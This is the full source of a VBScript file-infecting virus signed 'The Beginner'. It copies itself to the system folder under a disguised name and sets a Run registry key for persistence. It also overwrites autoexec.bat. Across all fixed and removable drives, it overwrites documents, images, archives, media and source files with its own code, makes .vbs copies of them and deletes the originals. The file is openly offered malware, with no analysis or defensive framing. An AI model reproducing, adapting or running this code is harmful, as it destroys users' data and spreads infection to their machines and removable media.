'-By cUk <----<>----> The Beginner...
 
On Error Resume Next
Dim fso,escribe,archiv
Set fso = CreateObject("scripting.filesystemobject")
Set archiv = fso.opentextfile(WScript.ScriptFullname,1) 
escribe =  archiv.ReadAll

main()
Sub main()
On Error Resume Next
ubica()
unidades()
End Sub
 
Sub registro(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
End Sub

Sub ubica
Dim dirsystem,cpy
Set dir = fso.getspecialfolder(1)
Set cpy = fso.GetFile(WScript.ScriptFullName) 
cpy.copy(dir&"\System32_.DLL.vbs") 
registro "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System32_",dir&"\System32_.DLL.vbs" 
End Sub 

Sub unidades()
	On Error Resume Next
        Dim  tipo, com ,archivo,x
        Set tipo = fso.drives
        Set archivo = fso.createtextfile("c:\autoexec.bat")
        archivo.writeline("cls")
   	  archivo.writeline("it has been infected by the virus, ¡The beginning!")	
            For Each com In tipo
            If com.drivetype = 3 Then  
            listar(com.path&"\")
            End If
            If com.drivetype = 2 Then
            listar(com.path&"\")
		End If
        Next
End Sub


Sub listar(folderspec)
        On error Resume Next
        Dim getfold, fold, com2
        Set getfold = fso.getfolder(folderspec)
        Set fold = getfold.subfolders
        For Each com2 In fold
            infecta(com2.path)
            listar(com2.path)
        Next
End Sub


Sub infecta(folderspec)
        On Error Resume Next
        Dim getfold, files, com3, exts,cpy,replica
        Set getfold = fso.getfolder(folderspec)
        Set files = getfold.files
        For Each com3 In files
        	exts = lcase(fso.GetExtensionName(com3.name))
            If exts = "xls" Or exts = "doc" Or exts = "ppt" Or exts = "mdb" Or exts = "txt" Or exts= "asp" Or exts = "html" Or exts = "jpg" Or exts = "jpeg" Or exts = "rar" Or exts = "zip" Or exts = "pdf" Or exts = "cpp" Or exts = "vbp" Or exts = "ocx" Or exts = "mp3" Or exts = "bmp" Or exts = "rpt" Then 
            Set cpy = fso.opentextfile(com3.path,2,True)
            cpy.write escribe
            cpy.close
            Set replica=fso.GetFile(com3.path)
            replica.copy(com3.path&".vbs")
            fso.deletefile(com3.path)
            End If
        Next
End Sub
